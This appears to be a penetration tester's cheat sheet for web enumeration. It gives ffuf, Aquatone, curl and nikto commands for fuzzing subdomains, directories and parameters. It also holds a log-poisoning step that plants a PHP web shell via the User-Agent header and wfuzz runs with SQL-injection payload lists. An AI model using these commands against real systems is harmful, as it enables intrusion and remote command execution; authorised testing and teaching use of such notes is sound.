# Hypertext Transfer Protocol

### Source Code Review

_Review source code and Page Contents With Burp Suite/Site Map. Add Target Scope under Target > Scope > Add_

_View Landing Page /_

_Add domain or hostname to Kali /etc/hosts file and review landing page /_

### General Scoping

* _Discover Potential Filename patterns for custom bruteforcing directories and files._
* _Discover usernames or email addresses with exiftool after downloading._
* _Discover HTTP Server Version._
* _Discover JavaScript Version._
* _Search For JavaScript Known Version Vulnerabilities._
* _Discover Web Application Name._
* _Discover Web Application Version._
* _Search For Web Application Known Version Vulnerabilities._
* _check certificate if applicable._
* _Discover Admin Login pages._
* _Test For default credentials._
* _Discover User Logins._
* _Discover User Registrations._

## Screenshot Inspection

### Aquatone

{% code overflow="wrap" %}
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_arm64_1.7.0.zip
```
{% endcode %}

```
cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption><p>tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking a screenshot.</p></figcaption></figure>

### View Certificate Information

_Browse to the `https://$ip/` and view the certificate_

### Server Header Information

```
curl -IL $webserver
```

### Fuzzing Sub-domains

{% code overflow="wrap" %}
```
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u https://FUZZ.domain.com/
```
{% endcode %}

### Fuzzing VHOSTs

{% code overflow="wrap" %}
```
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://domain.com/ -H 'Host: FUZZ.domain.com' -fs xxx
```
{% endcode %}

### Fuzzing Directories  Files Parameters

_Be sure to test both http and https_

_Extensions_

{% code overflow="wrap" %}
```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt -u http://domain.com/somedir/indexFUZZ -fc 404
```
{% endcode %}

_Directories_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/FUZZ/ -fc 404
```
{% endcode %}

_Files_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

_Parameters_

GET

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://$ip/somefile?FUZZ=key
```
{% endcode %}

POST

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://domain.com/path/to/resource.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
{% endcode %}

_Values_

_values can be for example usernames, names, id's_

{% code overflow="wrap" %}
```
ffuf -w values.txt -u http://domain.com/path/to/resource.php -X POST -d 'someParameter=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
{% endcode %}

_Random_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

### Response Headers

_Search headers such as X-Powered-By. This may reveal vulnerable versioning_

```
curl -I http://$ip/
```

### Command Injection

### Local File inclusion

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://$ip/site/index.php?page=FUZZ
```
{% endcode %}

_Linux_

```
curl http://$ip/ -A "<?php system(\$_GET['cmd']);?>"
```

_Windows_

```
curl http://$ip/site/index.php\?page=../../path/to/log\&cmd=ipconfig
```

### Remote File inclusion

### SQL injection

#### **Authentication Bypass**

Manually confirm the results to then filter out unwanted responses by using --hh

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "form" --hc 404 $url
```

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404 $url
```

### XXE

### XSS

### Nikto Vulnerability Scanner

```
nikto -h http://$ip
```
